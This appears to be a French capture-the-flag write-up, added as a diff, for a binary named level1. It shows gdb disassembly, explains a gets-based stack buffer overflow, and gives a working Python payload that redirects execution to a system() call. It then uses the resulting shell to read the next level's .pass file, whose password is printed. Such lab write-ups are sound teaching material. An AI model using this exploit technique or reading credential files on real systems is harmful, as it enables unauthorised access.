@@ -1,0 +1,56 @@
+$ gdb ./level1
+(gdb) disas main
+08048444 <run>:
+ 8048444:	55						push   %ebp
+ 8048445:	89 e5                	mov    %esp,%ebp
+ 8048447:	83 ec 18             	sub    $0x18,%esp
+ 804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
+ 804844f:	89 c2                	mov    %eax,%edx
+ 8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
+ 8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
+ 804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
+ 8048461:	00
+ 8048462:	c7 44 24 04 01 00 00	movl   $0x1,0x4(%esp)
+ 8048469:	00
+ 804846a:	89 04 24				mov    %eax,(%esp)
+ 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
+ 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
+ 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
+ 804847e:	c9                   	leave
+ 804847f:	c3                   	ret
+
+08048480 <main>:
+ 8048480:	55						push   %ebp
+ 8048481:	89 e5                	mov    %esp,%ebp
+ 8048483:	83 e4 f0             	and    $0xfffffff0,%esp
+ 8048486:	83 ec 50             	sub    $0x50,%esp
+ 8048489:	8d 44 24 10          	lea    0x10(%esp),%eax
+ 804848d:	89 04 24             	mov    %eax,(%esp)
+ 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
+ 8048495:	c9                   	leave
+ 8048496:	c3                   	ret
+ 8048497:	90                   	nop
+ 8048498:	90                   	nop
+ 8048499:	90                   	nop
+ 804849a:	90                   	nop
+ 804849b:	90                   	nop
+ 804849c:	90                   	nop
+ 804849d:	90                   	nop
+ 804849e:	90                   	nop
+ 804849f:	90                   	nop
+
+Le binaire alloue 0x50 octets d'espace memoire, puis appele gets avec esp+0x10.
+On peut donc a partir de 74 caracteres reecrire, sur la stack, l'eip du <main>.
+74 n'etant pas un multiple de 4 (74 / 4 = 18.5) il va falloir ecrire 76 caracteres pour avoir
+un bon alignement de bits.
+
+On voit une fonction <run> a ladresse 0x08048444 qui ne fait pas de <execve> mais 
+appelle <system>. Du coup il va falloir utiliser cat -.
+
+$ python -c 'print "A"*76 + "\x08\x04\x84\x44"[::-1]' > /tmp/toto
+$ cat /tmp/toto - | ./level1
+cat /home/user/level1/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+
+done.
